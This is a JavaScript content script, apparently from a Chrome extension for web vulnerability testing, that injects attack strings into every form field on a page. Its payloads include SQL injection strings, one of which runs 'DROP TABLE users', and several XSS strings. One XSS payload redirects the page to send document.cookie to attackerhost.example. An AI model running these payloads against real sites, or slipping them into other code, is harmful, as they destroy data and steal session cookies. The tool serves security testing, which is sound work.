$(document).ready(function() {
  var attacks = [[],[],[]];

  chrome.extension.onRequest.addListener(function(request, sender, sendResponse){
    if (request.type == 1 || request.type == 2) {
      sendResponse({acknowledged: "Mission accepted."});
      inject(request.type, request.attack);
    } else {
      sendResponse({acknowledged: "Mission denied."});
    }
  });

  function inject(type, attack) {
    var attack = attacks[type][attack];
    var inputs  = document.getElementsByTagName('input');
    var textareas = document.getElementsByTagName('textarea');

    for (i in inputs) {
      var input = inputs[i];
      var injection;
      
      if (input.type === 'password') {
        injection = attack('password_field');
      } else {
        injection = attack(input.name);
      }

      if (input.type === 'email') { 
        input.type = 'text';
      }

      if (input.type === 'checkbox') {
        input.checked = 'checked';
      }

      if (input.type === 'radio') {
        input.checked = 'checked';
      }

      input.value = injection;
      console.log(input.value);
    }

    for (t in textareas) {
      var textarea = textareas[t];
      injection = attack(textarea.name);
      textarea.value = injection;
      console.log(textarea.value);
    }
  }

  /* SQL debug assitance: attempts to create a table and insert a value for every vulnerable field. */
  var sql_debug = function(name) {
    return "CREATE TABLE sql_vuln IF NOT EXISTS (field VARCHAR); INSERT INTO sql_vuln VALUES('"+name+"');"; 
  }

  /* XSS debug assistance: creates a paragraph with some text that can be searched for by JS to notify
     of XSS vulnerabilities. */
  var js_debug = function(name) {
    return "$('body').append('<p class=\\'xss_vulnerable\\' style=\\'color:red;font-weight:bold;\\'>"+name+" is vulnerable to XSS.</p>');";
  }

  /* Basic SQL */
  attacks[1][0] = function(name) {
    return "' or '1'='1' -- '" + sql_debug(name);
  }

  /* DROP TABLE users attack */
  attacks[1][1] = function(name) {
    return "a';DROP TABLE users;" + sql_debug(name);
  }

  /* Select everything from users attack */
  attacks[1][2] = function(name) {
    return "a’;SELECT * FROM users WHERE 't' = 't';" + sql_debug(name);
  }

  /* Basic XSS */
  attacks[2][0] = function(name) {
    return "<script>console.log('"+name+" is vulnerable to XSS.');"+js_debug(name)+"</script>";
  }

  /* Style XSS Attack */
  attacks[2][1] = function(name) {
    return "@import\"javascript:console.log('"+name+" is vulnerable to a style attack.')\";"+js_debug(name);
  }
  
  /* Attribute attack */
  attacks[2][2] = function(name) {
    return "\"><script>console.log('"+name+" is vulnerable to an attribute attack.');"+js_debug(name)+"</script>";
  }

  /* Redirect cookie steal */
  attacks[2][3] = function(name) {
    return "<script>document.location='http://attackerhost.example/cgi-bin/cookiesteal.cgi?'+document.cookie</script>";
  }

  /* src/href attack */
  attacks[2][4] = function(name) {
    return "javascript:console.log('"+name+"');alert('"+name+" is vulnerable to XSS.');"
  }
});
